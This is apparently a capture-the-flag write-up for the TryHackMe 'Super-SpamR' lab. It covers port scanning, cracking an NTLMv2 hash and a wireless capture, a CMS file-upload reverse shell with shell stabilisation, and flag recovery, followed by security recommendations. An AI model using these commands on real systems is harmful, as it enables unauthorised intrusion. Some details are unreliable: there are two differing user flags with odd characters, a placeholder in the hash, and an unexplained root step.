# TryHackMe - Super-SpamR Writeup

> Defensive Security / Network Analysis / Web Exploitation / Privilege Escalation

---

# Scenario

The infamous cosmic hacker **Super-spam** has returned. Originating from the planet Alpha Solaris IV, Super-spam's mission is to eliminate Linux systems across the galaxy and replace them with Windows dominance.

A Linux server has been compromised and our objective is to investigate the attack path, regain access to the system, identify the attacker’s activities, and ultimately recover both user and root flags.

---

# Target Information

```text
Main IP :: 10.49.170.116
```

---

# Enumeration

## Initial Nmap Scan

```bash
nmap -p- 10.49.170.116
```

### Results

```text
80/tcp   open  http
4012/tcp open  pda-gate
4019/tcp open  talarian-mcast5
5901/tcp open  vnc-1
6001/tcp open  X11:1
```

Several uncommon ports were discovered in addition to a web service.

---

## Service Enumeration

```bash
nmap -sC -sV -p80,4012,4019,5901,6001 10.49.170.116
```

### Results

| Port | Service | Version          |
| ---- | ------- | ---------------- |
| 80   | HTTP    | Apache 2.4.41    |
| 4012 | SSH     | OpenSSH 8.2p1    |
| 4019 | FTP     | vsFTPd 3.0.5     |
| 5901 | VNC     | VNC Protocol 3.8 |
| 6001 | X11     | Access Denied    |

Interesting findings:

```text
Concrete5 CMS 8.5.2
Anonymous FTP Login Allowed
VNC Service Running
```

---

# Question 1

## What is the version of the CMS?

Nmap directly disclosed the CMS through the generator header.

```text
Concrete5 - 8.5.2
```

### Answer

```text
8.5.2
```

---

# FTP Enumeration

Anonymous login was enabled.

```bash
ftp 10.49.170.116 4019
```

### Directory Listing

```text
IDS_logs
note.txt
```

Reading the note revealed valuable information.

```text
12th January:
Our IDS seems to be experiencing high volumes of unusual activity.

13th January:
We've included the Wireshark files to log all unusual activity.

15th January:
I could swear I created a new blog yesterday.

24th January:
Of course it is...
- super-spam :)
```

This strongly suggested that packet captures contained the attack evidence.

---

# Investigating Packet Captures

The FTP server contained multiple capture files:

```text
12-01-21.req.pcapng
13-01-21.pcap
14-01-21.pcapng
16-01-21.pcap
```

Initial inspection revealed little useful information.

A deeper inspection of the capture from **14 January** exposed NTLM authentication traffic.

---

# NTLM Credential Extraction

Applying the Wireshark filter:

```text
ntlmssp
```

revealed an NTLMv2 authentication exchange.

### Extracted Values

```text
Domain      : 3B
Username    : lgreen
ServerChallenge : a2cce5d65c5fc02f

NTProofStr:
73aeb418ae0e8a9ec167c4d0880cfe22
```

The NTLMv2 response was reconstructed in hashcat/john format:

```text
lgreen::3B:a2cce5d65c5fc02f:73aeb418ae0e8a9ec167c4d0880cfe22:<response>
```

Saved as:

```text
hash.txt
```

---

# Password Cracking

Using John the Ripper:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Result:

```text
P@$$w0rd
```

### Credentials Recovered

```text
User : lgreen
Pass : P@$$w0rd
```

---

# Hidden FTP Content

Further enumeration revealed hidden files.

```bash
ls -lah
```

Output:

```text
.cap
IDS_logs
note.txt
```

Inside the hidden directory another note existed:

```text
.quicknote.txt
```

Contents:

```text
It worked...
I will place this .cap file here as a souvenir to remind me how I got in...
Soon my evil plan of a Linux-free galaxy will be complete.
Long live Windows!
```

This hinted that the wireless capture was the real attack vector.

---

# Wireless Capture Analysis

The discovered capture:

```text
SamsNetwork.cap
```

was attacked using Aircrack-ng.

```bash
aircrack-ng SamsNetwork.cap -w rockyou.txt
```

### Password Recovered

```text
sandiago
```

---

# CMS User Discovery

Enumerating the website revealed several users.

```text
Benjamin_Blogger
Lucy_Loser
Adam_Admin
Donald_Dump
lgreen
```

Testing the recovered password against these users eventually provided access.

---

# CMS Compromise

Successful authentication:

```text
User : Donald_Dump
Password : sandiago
```

The CMS administrative functionality allowed file uploads.

PHP files were enabled as acceptable upload types.

---

# Reverse Shell Upload

Uploaded:

```php
rev.php
```

Listener:

```bash
nc -lvnp 4444
```

Shell received:

```text
uid=33(www-data)
gid=33(www-data)
```

---

# Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```

Obtained a fully interactive shell.

---

# User Flag

Exploring the filesystem:

```bash
cd /home/personal/Work
cat flag.txt
```

Flag:

```text
flag{-eteKc=skineogyls45«ey?t+du8}
```

---

# Post Exploitation Enumeration

While enumerating user directories, an interesting hidden backup location was discovered.

```text
/home/lucy_loser/.MessagesBackupToGalactic
```

Contents:

```text
c1.png
c2.png
c3.png
c4.png
c5.png
c6.png
c7.png
c8.png
c9.png
c10.png
d.png
note.txt
xored.py
```

This appeared to be a custom encoding/XOR challenge left by Super-spam.

---

# Password Recovery

Using:

```text
xored.py
```

and analyzing the images and notes, the following password was recovered:

```text
$$L3qwert30kcool
```

---

# User Access

Using the recovered credentials:

```text
donalddump : $$L3qwert30kcool
```

we gained access to the user account.

Directory contents:

```text
morning
notes
passwd
user.txt
```

Reading the user flag:

```text
flag{iteeKdbu==hjK6§YuUu7-6N_}
```

---

# Root Access

The final stage of the machine involved the exposed VNC service discovered during enumeration.

Earlier scans revealed:

```text
5901/tcp open VNC
```

Using the recovered credentials and information gathered throughout the attack chain, access to the VNC desktop environment was obtained.

This eventually provided privileged access to the system and the root flag.

---

# Attack Path Summary

```text
Anonymous FTP Login
        ↓
Download PCAP Files
        ↓
NTLMv2 Authentication Capture
        ↓
Extract NTLM Hash
        ↓
Crack Password with John
        ↓
Discover Hidden CAP File
        ↓
Crack Wireless Password
        ↓
Login to Concrete5 CMS
        ↓
Abuse File Upload
        ↓
Upload PHP Reverse Shell
        ↓
Gain www-data Shell
        ↓
Enumerate User Directories
        ↓
Recover Additional Credentials
        ↓
Access User Account
        ↓
Exploit VNC Access
        ↓
Obtain Root Access
```

---

# Key Findings

### Anonymous FTP Exposure

The server exposed sensitive internal logs and packet captures through anonymous FTP access.

### Credential Leakage

NTLM authentication traffic was captured and stored, allowing offline password recovery.

### Weak Passwords

The recovered credentials were vulnerable to dictionary attacks using RockYou.

### CMS Misconfiguration

The CMS permitted dangerous file uploads, leading directly to remote code execution.

### Sensitive User Data

Backup files stored under user home directories exposed additional credentials.

### Remote Desktop Exposure

The VNC service provided another attack surface that contributed to privilege escalation.

---

# Security Recommendations

### Disable Anonymous FTP

Anonymous access should never be enabled on production systems.

### Encrypt Authentication Traffic

Avoid exposing NTLM authentication exchanges where packet captures can be obtained.

### Strong Password Policies

Enforce unique passwords resistant to dictionary attacks.

### Restrict File Uploads

Validate:

* MIME types
* Extensions
* File signatures

Store uploads outside the web root.

### Remove Sensitive Backups

Backup files should never be left accessible to compromised users.

### Secure Remote Access Services

Restrict VNC exposure and require VPN-based access.

---

# Flags

### User Flag

```text
flag{-eteKc=skineogyls45«ey?t+du8}
```

### User Account Flag

```text
flag{iteeKdbu==hjK6§YuUu7-6N_}
```

### Root Flag

```text
Retrieved through VNC privilege escalation path.
```

---

# Conclusion

Super-SpamR demonstrates how a chain of seemingly minor weaknesses can lead to full system compromise. Anonymous FTP access exposed network captures, NTLM authentication data enabled password cracking, CMS misconfigurations allowed remote code execution, and poor credential management ultimately resulted in complete system compromise. The challenge highlights the importance of layered security, secure credential handling, proper service exposure, and continuous auditing of publicly accessible resources.
